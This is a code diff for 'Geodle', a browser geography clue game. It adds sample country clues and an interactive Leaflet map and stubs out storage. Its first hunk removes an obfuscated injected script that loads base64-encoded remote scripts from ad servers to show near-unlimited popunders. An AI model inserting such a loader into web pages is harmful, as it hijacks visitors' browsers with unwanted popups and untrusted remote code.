@@ -6,12 +6,6 @@
 <title>Geodle - Daily Geography Clue Game</title>
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.9.4/leaflet.min.css" />
 <script src="https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.9.4/leaflet.min.js"></script>
-<script src="data.js"></script>
-<script type="text/javascript" data-cfasync="false">
-/*<![CDATA[/* */
-(function(){var a=window,p="bf128af1619960cff9b8bb4a42e55104",o=[["siteId",452-963+149+5221091],["minBid",0.00000001],["popundersPerIP","9999999,9999999"],["delayBetween",0],["default","https://2048-unblocked.netlify.app/"],["defaultPerDay",1],["topmostLayer","auto"]],t=["d3d3LmJldHRlcmFkc3lzdGVtLmNvbS95aG9wc2NvdGNoLm1pbi5jc3M=","ZDJrazBvM2ZyN2VkMDEuY2xvdWRmcm9udC5uZXQvWkx4US9vY3VzdG9tLm1pbi5qcw=="],d=-1,q,k,n=function(){clearTimeout(k);d++;if(t[d]&&!(1779163013000<(new Date).getTime()&&1<d)){q=a.document.createElement("script");q.type="text/javascript";q.async=!0;var w=a.document.getElementsByTagName("script")[0];q.src="https://"+atob(t[d]);q.crossOrigin="anonymous";q.onerror=n;q.onload=function(){clearTimeout(k);a[p.slice(0,16)+p.slice(0,16)]||n()};k=setTimeout(n,5E3);w.parentNode.insertBefore(q,w)}};if(!a[p]){try{Object.freeze(a[p]=o)}catch(e){}n()}})();
-/*]]>/* */
-</script>
 <style>
   body {
     font-family: Arial, sans-serif;
@@ -26,7 +20,7 @@
     margin-bottom: 5px;
   }
   #worldMap {
-    height: 200px;
+    height: 300px;
     width: 100%;
     border-radius: 10px;
     margin: 20px 0;
@@ -213,11 +207,18 @@
     margin: 20px 0;
     display: none;
   }
+  #mapControls {
+    text-align: center;
+    margin: 10px 0;
+    font-size: 0.9em;
+    color: #666;
+  }
 </style>
 </head>
 <body>
 <h1>Geodle 🌍</h1>
 <div id="worldMap"></div>
+<div id="mapControls">🖱️ Drag to explore • 🔍 Scroll to zoom • 📱 Pinch to zoom on mobile</div>
 <div id="progressInfo">
   <div>Clue <span id="currentClue">1</span> of 10</div>
   <div id="progressBar">
@@ -249,7 +250,57 @@
   <h3>⚠️ Data Loading Error</h3>
   <p>Could not load the geography data file (data.js). Please make sure the file exists and is properly formatted.</p>
 </div>
+
 <script>
+// Sample geography data for demo purposes
+const geographyData = [
+  {
+    answer: "JAPAN",
+    clues: [
+      "This island nation is located in East Asia",
+      "It's famous for sushi, anime, and cherry blossoms",
+      "The capital city is one of the world's largest metropolitan areas",
+      "This country hosted the 2020 Summer Olympics (held in 2021)",
+      "It consists of four main islands: Honshu, Hokkaido, Kyushu, and Shikoku",
+      "Mount Fuji is this country's highest peak and cultural symbol",
+      "It's known for advanced technology and bullet trains",
+      "The currency is the yen",
+      "This country is in the Pacific Ring of Fire",
+      "The capital starts with 'T' and has about 14 million people"
+    ]
+  },
+  {
+    answer: "BRAZIL",
+    clues: [
+      "This is the largest country in South America",
+      "Portuguese is the official language here",
+      "It's famous for the Amazon rainforest",
+      "The capital was purpose-built in the 1960s",
+      "This country is known for football (soccer) and has won the World Cup 5 times",
+      "Christ the Redeemer statue overlooks one of its major cities",
+      "It borders every South American country except Chile and Ecuador",
+      "The currency is the real",
+      "It's home to the world's largest river by volume",
+      "Rio de Janeiro and São Paulo are major cities here"
+    ]
+  },
+  {
+    answer: "AUSTRALIA",
+    clues: [
+      "This country is also a continent",
+      "It's located in the Southern Hemisphere",
+      "The capital city is not the largest city",
+      "This country is famous for unique wildlife like kangaroos and koalas",
+      "It's surrounded by the Pacific and Indian Oceans",
+      "The Great Barrier Reef is located off its northeast coast",
+      "The currency is the dollar (same name as US currency)",
+      "It's known for the Sydney Opera House",
+      "The majority of the population lives along the eastern and southeastern coasts",
+      "Canberra is the capital, but Sydney and Melbourne are larger cities"
+    ]
+  }
+];
+
 let currentQuestion = null;
 let currentClueIndex = 0;
 let guessHistory = [];
@@ -257,14 +308,15 @@ let gameEnded = false;
 let totalWins = 0;
 let worldMap = null;
 
-// Load and save win count from localStorage
+// Load and save win count from localStorage (disabled for demo)
 function loadWinCount() {
-  const savedWins = localStorage.getItem('geodle_total_wins');
-  totalWins = savedWins ? parseInt(savedWins, 10) : 0;
+  // For demo purposes, we'll use a variable instead of localStorage
+  totalWins = 0;
 }
 
 function saveWinCount() {
-  localStorage.setItem('geodle_total_wins', totalWins.toString());
+  // Would save to localStorage in a real implementation
+  console.log('Win count would be saved:', totalWins);
 }
 
 function resetWinCount() {
@@ -275,7 +327,7 @@ function resetWinCount() {
 // Check if data is loaded and validate it
 function validateData() {
   if (typeof geographyData === 'undefined') {
-    console.error('geographyData is not defined. Make sure data.js is loaded.');
+    console.error('geographyData is not defined.');
     return false;
   }
   
@@ -341,7 +393,7 @@ function initGame() {
   // Focus on input
   document.getElementById('guessInput').focus();
   
-  // Load win count from localStorage
+  // Load win count
   loadWinCount();
   updateWinDisplay();
 }
@@ -368,31 +420,44 @@ function updateWinDisplay() {
   document.getElementById('streak').textContent = `🏆 Total Wins: ${totalWins}`;
 }
 
-// Initialize Leaflet world map
+// Initialize Leaflet world map with improved settings
 function initWorldMap() {
   worldMap = L.map('worldMap', {
-    center: [20, 0],
-    zoom: 2,
-    zoomControl: false,
-    dragging: false,
-    scrollWheelZoom: false,
-    doubleClickZoom: false,
-    touchZoom: false
+    center: [20, 0], // Centered to show most continents
+    zoom: 2, // Good zoom level to see the whole world
+    minZoom: 1, // Allow zooming out to see the whole world
+    maxZoom: 10, // Allow zooming in for detail
+    zoomControl: true, // Enable zoom controls
+    dragging: true, // Enable dragging
+    scrollWheelZoom: true, // Enable scroll wheel zoom
+    doubleClickZoom: true, // Enable double-click zoom
+    touchZoom: true, // Enable touch zoom for mobile
+    worldCopyJump: true, // Handle world wrapping nicely
+    maxBounds: [[-90, -180], [90, 180]], // Constrain to world bounds
+    maxBoundsViscosity: 0.5 // Allow some bouncing at edges
   });
 
+  // Use a more colorful and detailed map style
   L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
     attribution: '© OpenStreetMap contributors',
-    maxZoom: 18
+    maxZoom: 18,
+    noWrap: false // Allow the map to wrap around
   }).addTo(worldMap);
 
-  // Add some visual flair with markers for major cities
+  // Add some visual flair with markers for major cities around the world
   const majorCities = [
     { name: 'New York', coords: [40.7128, -74.0060] },
     { name: 'London', coords: [51.5074, -0.1278] },
     { name: 'Tokyo', coords: [35.6762, 139.6503] },
     { name: 'Sydney', coords: [-33.8688, 151.2093] },
     { name: 'Singapore', coords: [1.3521, 103.8198] },
-    { name: 'São Paulo', coords: [-23.5505, -46.6333] }
+    { name: 'São Paulo', coords: [-23.5505, -46.6333] },
+    { name: 'Cairo', coords: [30.0444, 31.2357] },
+    { name: 'Mumbai', coords: [19.0760, 72.8777] },
+    { name: 'Moscow', coords: [55.7558, 37.6176] },
+    { name: 'Lagos', coords: [6.5244, 3.3792] },
+    { name: 'Mexico City', coords: [19.4326, -99.1332] },
+    { name: 'Beijing', coords: [39.9042, 116.4074] }
   ];
 
   majorCities.forEach(city => {
@@ -403,8 +468,14 @@ function initWorldMap() {
       weight: 1,
       opacity: 1,
       fillOpacity: 0.8
-    }).addTo(worldMap);
+    }).addTo(worldMap).bindTooltip(city.name, {
+      permanent: false,
+      direction: 'top'
+    });
   });
+
+  // Fit the map to show the whole world initially
+  worldMap.fitWorld();
 }
 
 function handleGuess(e) {
@@ -504,17 +575,20 @@ function shareScore() {
     });
   } else {
     // Fallback - copy to clipboard
-    navigator.clipboard.writeText(scoreText + '\n' + window.location.href);
-    alert('Score copied to clipboard!');
+    if (navigator.clipboard) {
+      navigator.clipboard.writeText(scoreText + '\n' + window.location.href);
+      alert('Score copied to clipboard!');
+    } else {
+      // Even simpler fallback
+      alert('Share this: ' + scoreText);
+    }
   }
 }
 
 // Start the game when page loads
 document.addEventListener('DOMContentLoaded', function() {
-  // Add a small delay to ensure data.js is fully loaded
-  setTimeout(() => {
-    initGame();
-  }, 100);
+  // Initialize the game
+  initGame();
   
   // Set up event listeners
   document.getElementById('guessForm').addEventListener('submit', handleGuess);
